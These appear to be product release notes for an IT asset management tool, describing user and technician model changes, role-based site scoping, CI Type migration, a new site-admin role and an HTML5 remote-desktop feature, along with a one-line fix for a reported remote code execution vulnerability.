### Behavior Changes Related to Users in AE 6600 :

(Released on: 21 November 2019)

* The Users list view will hold all users in the organization i.e both requesters and technicians.
* SMS Mail ID would be available for all users. Previously it was provided only for technicians.
* Primary and secondary emails, Reporting To field would be available for all users.
* Introduction of site scoping for technicians as a part of add/edit roles itself with the option **Technician allowed to view**. The scoping options provided are **All** or **All in associated sites**. Previously site based restrictions would work based on sites chosen on the technician page along with module-level roles chosen.

  **How the cases are handled in Migration**

  1. If a technician is provided with an Asset Only custom role with certain sites under Restrict site(s), a new role by name Asset Only\_SiteRestriction\_1 would be created and associated with this technician. This new role with the same module-level scope as the previous Asset Only role and have the option All in associated sites enabled under Technician allowed to view.
  2. If a technician is provided with only EnableCMDB role and sites are configured under Restrict site(s), a new role by name Asset\_SiteRestriction\_1 would be created and associated with this technician along with EnableCMDB. This new role would have view permission for asset modules and the site restriction.
* There were only 3 default CI Types representing the **Users - People**; the parent CI Type and **Requesters** and **Technicians**; child CI Types. Any hence any new child CI Type could be created only for **Requesters** or **Technicians**. Now, there is just one CI Type i.e **Users** and any child CI Type can be created under it. This change was mainly introduced as we restrict the CMDB Managers from categorizing the users in the organization either as **Requesters** or **Technicians**. With this new model, the CMDB Manager can categorize the users as per their organizational child CI Types.
  1. All the existing relationships of the Users would be retained even after migration.
  2. The relationship attributes created for CI Type Requester and Technician relationships would be lost after migration.
  3. All the CI attributes of People and Requester CI Type (except system attributes) are moved as User additional fields.
  4. All the system attributes of Requester and Technician CI Type are moved to User CI Type during migration.
  5. All the child CI Types of Requester and Technician CI Types are moved under User CI Type.
* The **Technician** CI Type has been removed.
* The CMDB API for requesters and technicians is removed and moved to new APIs. http(s)://:/api/v3/users

### New Features

**User and Technician additional fields**

* Use additional fields to fetch extra details from the user and technician profiles.

**SDSiteAdmin Role**

* Introducing **SDSiteAdmin** role. Technicians with this role would be considered as administrators of the sites associated with them and for those technicians, the admin tab would be displayed with entities such as users, technicians, departments, and sites.

### Issues fixed

* AEI-82348: Remote code execution (RCE) vulnerability during SCCM scan initiation (CVE-2019-19034) reported by Sahil Dhar (xen1thlabs).

### Features in service pack 6130 (Released on: 18 September 2017)

* AEF-63026 : WebRemote feature helps in taking remote session of Windows machines.
  + It is fast, and does not depend on any browser plugin.
  + Since it is HTML5 browser based, remote to Windows machine can be perfomed from any OS/device.
  + This feature uses Microsoft RDP and does not require agents to be installed in the remote machine.
  + The remote sessions can be recorded and played back later.
  + The sessions recorded are captured under asset's history and request's notes section.
  + Limitation : Remote sessions to Windows 10 machines is not possible now and would be resolved in one of the immediate service pack as we upgrade to Jre 1.8.

### Behaviour change :

If product type name change has modified the name of a child CI Type instead of the parent CI Type, during migration the child CI Type name is reverted back to the original name and parent CI Type name is modified as the latest product type name. For eg: if product type "IP Phone" is changed as "ABC", then the child CI Type "Cisco IP phone" would have changed to "ABC". Now in this migration, "Cisco IP Phone" CI Type would be reverted back to its old name and "IP Phone" CI Type would be modified as "IP Phone'.
